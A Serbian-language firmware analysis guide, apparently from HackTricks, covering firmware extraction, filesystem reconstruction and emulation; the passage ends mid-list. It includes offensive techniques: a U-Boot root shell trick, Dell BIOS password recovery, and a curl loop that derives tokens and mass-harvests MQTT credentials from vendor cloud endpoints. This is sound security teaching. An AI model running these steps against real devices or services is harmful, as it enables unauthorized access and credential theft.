# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmver je ključni softver koji omogućava ispravan rad uređaja upravljajući komunikacijom između hardverskih komponenti i softvera sa kojim korisnici rade. Skladišti se u trajnoj memoriji, pa uređaj može da pristupi važnim instrukcijama čim se uključi, što dovodi do pokretanja operativnog sistema. Ispitivanje i potencijalno menjanje firmvera ključan je korak u otkrivanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključni početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- Arhitekturi CPU-a i operativnom sistemu koji pokreće
- Specifičnostima bootloader-a
- Hardverskom rasporedu i listovima sa specifikacijama
- Metrikama baze koda i lokacijama izvornog koda
- Spoljnim bibliotekama i vrstama licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i otkrivenim ranjivostima

U tu svrhu, alati za **open-source intelligence (OSINT)** su neprocenjivi, kao i analiza dostupnih open-source softverskih komponenti putem ručnih i automatizovanih pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Preuzimanje firmvera**

Firmver se može pribaviti na više načina, od kojih svaki ima svoj nivo složenosti:

- **Direktno** od izvora (programera, proizvođača)
- **Izgradnjom** pomoću dostavljenih uputstava
- **Preuzimanjem** sa zvaničnih stranica podrške
- Korišćenjem upita **Google dork** za pronalaženje hostovanih datoteka firmvera
- Direktnim pristupom **skladištu u oblaku**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću man-in-the-middle tehnika
- **Ekstrakcijom** sa uređaja putem veza kao što su **UART**, **JTAG** ili **PICit**
- **Njuškanjem** zahteva za ažuriranje u komunikaciji uređaja
- Pronalaženjem i korišćenjem **hardkodiranih krajnjih tačaka za ažuriranje**
- Pravljenjem **dump-a** iz bootloader-a ili mreže
- **Uklanjanjem i očitavanjem** čipa za skladištenje podataka, kada ništa drugo ne uspe, pomoću odgovarajućih hardverskih alata

### Samo UART logovi: pokrenite root shell preko U-Boot env-a u flash-u

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete da pokrenete init shell tako što ćete **izmeniti U-Boot environment blob** van uređaja:<sup>[[6]](#references)</sup>

1. Napravite dump SPI flash-a pomoću SOIC-8 klipse i programatora (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na ugrađenim uređajima na kojima je shell bootloader-a onemogućen, ali je env particija upisiva pomoću spoljnog pristupa flash memoriji.

## Analiza firmware-a

Sada kada **imate firmware**, potrebno je da iz njega izdvojite informacije kako biste znali kako da ga obradite. Za to možete da koristite različite alate:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** slike pomoću `binwalk -E <bin>`. Ako je entropija niska, verovatno nije šifrovana. Ako je visoka, verovatno je šifrovana (ili komprimovana na neki način).

Pored toga, pomoću ovih alata možete izdvojiti **datoteke ugrađene u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili pomoću [**binvis.io**](https://binvis.io/#/) ([kod](https://code.google.com/archive/p/binvis/)) pregledati datoteku.

### Diferencijalna analiza flash memorije i oporavljiva XOR skladišta tajni

Kada format skladištenja podešavanja u firmware-u nije dokumentovan, prvo napravite nekoliko očitavanja flash memorije sa istim podešavanjima, promenite **tačno jedno** podešavanje, ponovo napravite dump celog čipa i uporedite pomeraje. Ponavljanjem eksperimenta sa kontrolisanim vrednostima možete razlikovati to podešavanje od brojača i metapodataka o upisivanju; promene na novim pomerajima, umesto na postojećim, ukazuju na skladište koje samo dodaje podatke ili je strukturirano kao dnevnik. Sačuvajte i obrisane/tombstone zapise jer njihovi bajtovi podataka i dalje mogu biti oporavljivi.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nakon lociranja regiona, izdvojite module firmvera pomoću alata kao što je `binwalk` i reverzno analizirajte writer/validator u Ghidra. U kodu potvrdite granice polja, padding, indeksiranje ključa i izvođenje ključa, umesto da šemu zaključujete samo na osnovu obrazaca šifrovanog teksta.<sup>[[12]](#references)</sup>

#### Oporavak ključeva iz šifrovanog paddinga nula

Kao što je opisano u [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), poznati otvoreni tekst otkriva bajtove keystream-a na istim pomerajima. Polje fiksne veličine naročito je izloženo kada se njegov padding nulama proteže preko svih indeksa ponavljajućeg XOR ključa: šifrovani padding direktno otkriva te bajtove ključa jer je `0x00 XOR key_byte = key_byte`. Ako su obuhvaćeni svi indeksi ključa, rekonstrušite ključ iz završnog dela šifrata i dešifrujte popunjene bajtove.<sup>[[12]](#references)</sup>

Dell-ov ranjivi DVAR format BIOS lozinke konkretan je primer: bajt `0` polja od 32 bajta je u otvorenom tekstu, dok se za bajtove `1..31` koristi ponavljajući ključ od 20 bajtova.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Za dužinu lozinke `L`, pozicije `L..31` bile su nule pre XOR operacije. Kada je `L <= 12`, te pozicije pokrivaju svaki indeks ključa, pa se ceo ključ i lozinka mogu oporaviti bez brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Izvucite ključeve iz istorijskih zapisa

Nemojte analizirati svaki zapis zasebno. DVAR ključ se približno izvodi kao `modified_md5(device_seed || variable_GUID || password[0])`: seed uređaja i GUID su fiksni, a jedini unos koji zavisi od lozinke jeste njen prvi bajt u otvorenom tekstu. To daje najviše 256 ključeva po uređaju, pa zapisi koji počinju istim bajtom dele ključ. Grupisanje aktivnih i obrisanih zapisa prema tom bajtu omogućava da kratak istorijski zapis otkrije ceo ključ preko paddinga i dešifruje trenutni, duži zapis čiji padding nije dovoljan. Zato promena lozinke može povećati izloženost ako se stari šifrat označi kao obrisan, umesto da se izbriše.<sup>[[12]](#references)</sup>

Alat [`dellpwn`](https://github.com/R3n5k1/dellpwn) pronalazi DVAR, proverava kandidate za zapise, oporavlja lozinke i može da prikaže sirove sačuvane bajtove i bajtove ključa. Napravite ga iz checkout-a i skenirajte proverenu flash sliku na sledeći način:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Za prilagođene parsere odbacite lažno pozitivne rezultate proverom strukture zapisa, ograničenja za štampive znakove, nultog popunjavanja, entropije ključa i doslednosti na mestima gde se ključ ponavlja. Ako ponovljeni dumpovi pokazuju retke promene bitova pri svakom upisu, popišite uočene maske i rangirajte ispravke pomoću ovih ograničenja, ali prijavite dvosmislene znakove umesto da heuristički rezultat predstavite kao tačno izdvajanje.<sup>[[12]](#references)</sup>

Provere lozinki treba da čuvaju jednosmerni hash sa saltom i iteracijama, a ne reverzibilni šifrat, dok bi skladišta sa strukturom dnevnika trebalo bezbedno da uklone zastareli tajni materijal.<sup>[[12]](#references)</sup>

### Preuzimanje fajl-sistema

Uz prethodno navedene alate, poput `binwalk -ev <bin>`, trebalo je da budete u mogućnosti da **izdvojite fajl-sistem**.\
Binwalk ga obično izdvaja u **fasciklu nazvanu po tipu fajl-sistema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje fajl-sistema

Ponekad binwalk **neće imati bajt za prepoznavanje fajl-sistema u svojim potpisima**. U tim slučajevima upotrebite binwalk da **pronađete pomeraj fajl-sistema, izdvojite komprimovani fajl-sistem** iz binarne datoteke i **ručno izdvojite** fajl-sistem prema njegovom tipu, prateći korake u nastavku.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Pokrenite sledeću **dd command** za izdvajanje Squashfs sistema datoteka.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Datoteke će se nakon toga nalaziti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 datotečne sisteme

`$ jefferson rootfsfile.jffs2`

- Za ubifs datotečne sisteme sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Rekonstrukcija podeljenih ugrađenih root datotečnih sistema

Ako sirovi eMMC/SSD dump sadrži ispravno zaglavlje datotečnog sistema, ali se njegovi metapodaci protežu izvan nominalne particije, nemojte ga odmah klasifikovati kao oštećen. Ugrađeni boot kod može pomoću Device Mapper-a da sastavi stvarni root uređaj iz više fizičkih opsega, pa izdvajanje jedne GPT particije daje samo prvi segment.<sup>[[9]](#references)</sup>

#### Triage kompletne slike medija

Prvo proverite da li je preuzimanje završeno, da li je veličina stabilna i da li neki proces još uvek upisuje u sliku. Ako naziv datoteke sadrži početnu i završnu adresu, uporedite taj opseg sa stvarnim brojem bajtova. Oporavite GPT u režimu samo za čitanje i priključite samo neophodan opseg; **nemojte** pokretati `vgchange -ay` nad nepouzdanim fizičkim volumenom na radnoj stanici, jer može doći do konflikta grupa volumena i neželjenih upisa.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Koristite disposable VM kada originalna init logika ili LVM stack mora da vidi celu sliku. Istorijski boot logovi sa standardne boot particije posebno su korisni: bootloader je možda zabeležio offsete proprietary-container-a, dužine komponenti, izbor slota, pravila poravnanja i proveru potpisa. Koristite te vrednosti da izdvojite ugrađeni command line/kernel/initramfs, a zatim nezavisno proverite svaki izlaz pomoću `file`, magic bytes i `binwalk`; čitanje do kraja kontejnera može slučajno da doda initrd, ACPI objekat ili potpis kernelu.<sup>[[9]](#references)</sup>

#### Oporavak block mape pri pokretanju

Izdvojite kernelov initramfs i izvršite reverse engineering njegovog `/init` i svih storage biblioteka. U [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), pratite reference stringova za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i putanje particija; zatim pratite kod koji bira aktivni A/B slot i pravi tabelu. Korisne početne tačke u radare2 su `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

linear target mapira uzastopne opsege virtuelnog uređaja na opsege jednog ili više backing uređaja. Oporavljena tabela sa dva segmenta obično izgleda ovako (sve pozicije i dužine su u sektorima od 512 bajtova):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Tačno reprodukujte aritmetiku mašinskog koda, uključujući širinu celih brojeva, pomeranja i konverzije jedinica. Na primer, sledeći izraz zaokružuje veličinu u bajtovima naniže na granicu od 4 KiB i tek onda je pretvara u sektore od 512 bajtova; ako ga zamenite izrazom `p4_bytes // 512`, izabrani završni deo se pomera za `p4_bytes % 4096` kad god particija nije poravnata po stranici.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstrušite ravnu analitičku sliku kopiranjem opsega redosledom iz tabele, u ograničenim blokovima, umesto učitavanja celog dump-a medija u memoriju. Time se izbegava i kreiranje host-side mapper uređaja. Zadržite GPT-derived pomeraje, obrnute brojeve sektora i dužinu rezultujućeg izlaza kao zasebne provere.<sup>[[9]](#references)</sup>

#### Razlikovanje oštećenja od greške u rekonstrukciji sa konstantnim pomakom

Za SquashFS proverite magic `hsqs` i dekodirajte 64-bitno polje `bytes_used` u little-endian formatu na pomeraju 40 u superbloku pre pokretanja `unsquashfs`. Ako ekstrakcija ne uspe u nekoliko nepovezanih struktura, pretražite širok opseg oko očekivanih pozicija i zahtevajte uverljive strukturne kandidate: blok metapodataka koji može da se dekompresuje, nekoliko uzastopnih ispravnih unosa direktorijuma, uverljiva polja inode-a, root inode usklađen sa brojem inode-a ili ispravnu strukturu metapodataka za proveru integriteta. Jedno poklapanje magic vrednosti nije dovoljno.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Kada ista potpisana razlika učini validnim nezavisne strukture — na primer, metapodatke direktorijuma i verity zapis — verovatni uzrok je sistematska greška u početku segmenta, a ne nedostajući bajtovi. Vratite se na obrnutu aritmetiku i potražite odbačene ostatke pri deljenju, predznak, prekoračenje ili zaokruživanje na granice sektora/stranica pre nego što pokušate oporavak izgubljenih podataka ili izmenu metapodataka sistema datoteka.<sup>[[9]](#references)</sup>

Na kraju, držite granice zaštite odvojeno: LUKS volumeni čiji su ključevi zapečaćeni TPM-om štite poverljivost podataka, dok potpisano dm-verity mapiranje štiti integritet root sistema datoteka. Softverski TPM ne može da povrati ključ zapečaćen za originalni fizički TPM, a pokretanje izmenjenog SquashFS-a pomoću istraživačkog init-a koji izostavlja verity proveru ne falsifikuje njegov potpis niti razbija dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmvera

Kada se firmver pribavi, neophodno ga je analizirati da biste razumeli njegovu strukturu i moguće ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz slike firmvera.

### Alati za početnu analizu

Naveden je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u prepoznavanju tipova datoteka, izdvajanju nizova, analizi binarnih podataka i razumevanju detalja particija i sistema datoteka:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Da bi se procenilo stanje enkripcije slike, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo enkripcije, dok visoka entropija može ukazivati na enkripciju ili kompresiju.

Za izdvajanje **ugrađenih datoteka** preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Izdvajanje fajl sistema

Pomoću `binwalk -ev <bin>` obično je moguće izdvojiti fajl sistem, često u direktorijum nazvan po tipu fajl sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne prepozna tip fajl sistema zbog nedostajućih magičnih bajtova, potrebno je ručno izdvajanje. To podrazumeva korišćenje alata `binwalk` za pronalaženje pomeraja fajl sistema, a zatim komande `dd` za izdvajanje fajl sistema:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Nakon toga se, u zavisnosti od tipa filesystema (npr. squashfs, cpio, jffs2, ubifs), koriste različite komande za ručno izdvajanje sadržaja.

### Analiza filesystema

Kada se filesystem izdvoji, počinje potraga za bezbednosnim propustima. Posebna pažnja posvećuje se nebezbednim mrežnim daemonima, hardkodovanim akreditivima, API krajnjim tačkama, funkcionalnostima servera za ažuriranje, nekompajliranom kodu, skriptama za pokretanje i kompajliranim binarnim datotekama za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati uključuju:

- **etc/shadow** i **etc/passwd** za akreditive korisnika
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione datoteke i skripte zbog mogućih ranjivosti
- Ugrađene binarne datoteke za dalju analizu
- Uobičajene veb servere i binarne datoteke IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti u filesystemu:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih datoteka

I izvorni kod i kompajlirane binarne datoteke pronađene u filesystemu moraju se pažljivo pregledati zbog ranjivosti. Alati kao što su **checksec.sh** za Unix binarne datoteke i **PESecurity** za Windows binarne datoteke pomažu u prepoznavanju nezaštićenih binarnih datoteka koje bi mogle da budu iskorišćene.

## Preuzimanje cloud konfiguracije i MQTT akreditiva pomoću izvedenih URL tokena

Mnogi IoT hubovi preuzimaju konfiguraciju za svaki uređaj sa cloud krajnje tačke koja izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodovanog tajnog ključa, na primer:

- token = MD5( deviceId || STATIC_KEY ) i prikazan je kao heksadecimalni zapis velikim slovima

Ovakav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, čime se često otkrivaju MQTT akreditivi i prefiksi tema u otvorenom tekstu.

Praktični postupak:

1) Izdvojite deviceId iz UART boot logova

- Povežite UART adapter od 3.3 V (TX/RX/GND) i zabeležite logove:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Potražite linije koje ispisuju obrazac URL-a konfiguracije u oblaku i adresu brokera, na primer:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Pronađite STATIC_KEY i algoritam tokena u firmware-u

- Učitajte binarne datoteke u Ghidra/radare2 i potražite putanju konfiguracije ("/pf/") ili upotrebu MD5-a.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash-u i pretvorite sažetak u velika slova:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Prikupite cloud config i MQTT credentials

- Sastavite URL i preuzmite JSON pomoću curl-a; parsirajte ga pomoću jq-a da biste izdvojili tajne:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Zloupotreba MQTT-a bez enkripcije i slabih ACL pravila za teme (ako postoje)

- Koristite oporavljene akreditive da biste se pretplatili na teme za održavanje i potražili osetljive događaje:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerišite predvidljive ID-jeve uređaja (u velikom obimu, uz ovlašćenje)

- Mnogi ekosistemi sadrže OUI/proizvod/tip bajtove dobavljača, praćene sekvencijalnim sufiksom.
- Možete iterirati kroz moguće ID-jeve, programski izvoditi tokene i preuzimati konfiguracije:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Beleške
- Uvek pribavite izričito odobrenje pre pokušaja masovnog enumerisanja.
- Kad god je moguće, prednost dajte emulaciji ili statičkoj analizi radi otkrivanja tajni, bez izmena na ciljnom hardveru.

Emulacija firmware-a omogućava **dinamičku analizu** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog zavisnosti od hardvera ili arhitekture, ali prebacivanje root fajl sistema ili određenih binarnih datoteka na uređaj odgovarajuće arhitekture i endianness-a, kao što je Raspberry Pi, ili na unapred pripremljenu virtuelnu mašinu, može olakšati dalje testiranje.

### Emulacija pojedinačnih binarnih datoteka

Pri ispitivanju pojedinačnih programa ključno je utvrditi njihov endianness i CPU arhitekturu.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke za MIPS arhitekturu možete koristiti komandu:

```bash
file ./squashfs-root/bin/busybox
```

A da biste instalirali neophodne alate za emulaciju:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke little-endian koristi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke postupak je sličan, a za emulaciju se koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizujući proces i pomažući u dinamičkoj analizi.

### Rekonstrukcija podeljenih i verifikovanih root fajl sistema za emulaciju

Ako je SquashFS superblok čitljiv, ali su pomeraji inode-a, direktorijuma ili fragment-tabele nemogući, nemojte odmah menjati `unsquashfs`. Obrnite rani boot binarni fajl i reprodukujte graf blok-uređaja koji on pravi: ugrađeni sistemi mogu izlagati nominalnu root particiju, ali stvarni fajl sistem mogu konstruisati pomoću `dm-linear` mapiranja koje dodaje sektore pozajmljene iz druge particije. Provere koje koriste samo superblok mogu proći čak i kada su svi naredni blokovi metapodataka pomereni.<sup>[[11]](#references)</sup>

Tačno sačuvajte aritmetiku firmware-a. Posebno utvrdite da li su dužine izražene u bajtovima, sektorima od 512 bajtova ili stranicama od 4 KiB; reprodukujte pomeranja bitova i skraćivanje prvobitnim redosledom; i uzmite u obzir završne regione koji zavise od banke u A/B rasporedima. Na primer, `(partition_bytes >> 12) << 3` najpre skraćuje vrednost na granicu od 4 KiB, a tek zatim izražava rezultat u sektorima od 512 bajtova; zamena izrazom `partition_bytes // 512` može pomeriti dodati opseg za nekoliko kilobajta i oštetiti sve naredne SquashFS tabele.<sup>[[11]](#references)</sup>

Koristan postupak validacije je:<sup>[[11]](#references)</sup>

1. Iz verifier/init binarnog fajla utvrdite izvorni uređaj, početni sektor i dužinu svakog `dm-linear` segmenta.
2. Spojite opsege ili ih mapirajte bez menjanja pravila poravnanja.
3. Ako izdvajanje i dalje ne uspe, pretražite samo mali opseg oko predviđene granice i zahtevajte nekoliko uzastopnih validnih struktura metapodataka, umesto da prihvatite samo verovatan superblok.
4. Pokrenite neizmenjeni `unsquashfs` nad rekonstruisanom slikom; uspešno pregledanje svih direktorijuma i fragmenata predstavlja jači dokaz od rezultata `unsquashfs -stat`.

#### Zamena dm-verity koju kontroliše analitičar

Kada analitičar kontroliše QEMU kernel, initramfs i virtuelne diskove, izmenjeni root može da se pokrene tako što se PID 1 za verifikaciju dobavljača zameni malim, statički povezanim init programom. Ovo je **zamena boot lanca u laboratorijskom okruženju**, a ne probijanje dm-verity, njegovog RSA potpisa, Secure Boot-a ili ključa zapečaćenog TPM-om.<sup>[[11]](#references)</sup>

Zamenjeni init treba da oponaša operativne delove originalnog boot postupka: montira `devtmpfs`, pozove `setsid()`, poveže `/dev/console` sa deskriptorima fajlova 0–2, montira `/proc` i `/sys`, sačeka zadati blok-uređaj, montira izmenjeni root samo za čitanje, odvoji pseudo-fajl sisteme starog root-a, premesti novo montiranje na `/`, pozove `chroot` i izvrši firmware-ov originalni `/sbin/init` pomoću `execve()`. Odvajanje `/dev`, `/proc` i `/sys` **pre** `MS_MOVE` sprečava slučajno odvajanje tačaka montiranja koje pripadaju novom root-u.<sup>[[11]](#references)</sup>

Stanje uređaja koje se može menjati držite odvojeno od izmenjenog nepromenljivog root-a. qcow2 overlay može da sačuva LVM stanje originalnog diska, dok drugi virtio disk, montiran samo za čitanje, obezbeđuje izmenjeni SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Otklanjanje grešaka u stanju image-a van mreže

Pregledajte trajno stanje izvan guest-a kada sporo podizanje sistema, destruktivne startup skripte ili nepouzdano evidentiranje u konzoli otežavaju utvrđivanje uzroka greške. Nikada ne priključujte overlay koji koristi pokrenuta VM; učinite ga dostupnim pomoću `qemu-nbd`, ograničite LVM otkrivanje na predviđenu NBD particiju i deaktivirajte volume group pre prekidanja veze.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Za ponovljivo izolovanje kvarova, upisujte vremenski označene marker fajlove na stabilan volumen u koji može da se upisuje i proveravajte ih van mreže; `/dev/kmsg`, FIFO datoteke i prolazne konzole mogu da daju lažno negativne rezultate zbog ograničavanja učestalosti ili preuranjenog gašenja procesa. Takođe, uporedite tačne interfejse između slojeva pre nego što menjate nepovezan kod: `uname -r` u odnosu na `/lib/modules/`, funkcije ext4 na disku u odnosu na konfiguraciju kernela i generaciju Mesa `libGL` u odnosu na DRI driver ABI i nazive drivera izvedene iz PCI podataka. Komponenta može postojati, pa čak i da se uspešno učita pomoću `dlopen()`, a da pritom ostane neupotrebljiva jer njen potrošač očekuje drugačiji ABI.<sup>[[11]](#references)</sup>

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi okruženje stvarnog ili emuliranog uređaja. Neophodno je zadržati shell pristup OS-u i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, zbog čega će povremeno biti potrebno ponovo pokrenuti emulaciju. Analiza treba ponovo da obuhvati sistem datoteka, iskorišćavanje izloženih veb-stranica i mrežnih servisa i istraživanje ranjivosti bootloadera. Testovi integriteta firmware-a ključni su za prepoznavanje potencijalnih ranjivosti backdoor-a.

## Tehnike analize tokom izvršavanja

Analiza tokom izvršavanja podrazumeva interakciju sa procesom ili binarnim fajlom u njegovom operativnom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje tačaka prekida i otkrivanje ranjivosti fuzzing-om i drugim tehnikama.

Za embedded ciljne sisteme bez kompletnog debugger-a, **kopirajte statički povezan `gdbserver`** na uređaj i povežite se sa njim udaljeno:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapiranje Zigbee / poruka radio-koprocesora

Na IoT čvorištima RF stek je često podeljen između **radio MCU-a** i Linux procesa u korisničkom prostoru. Koristan postupak je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF okvir** u etru
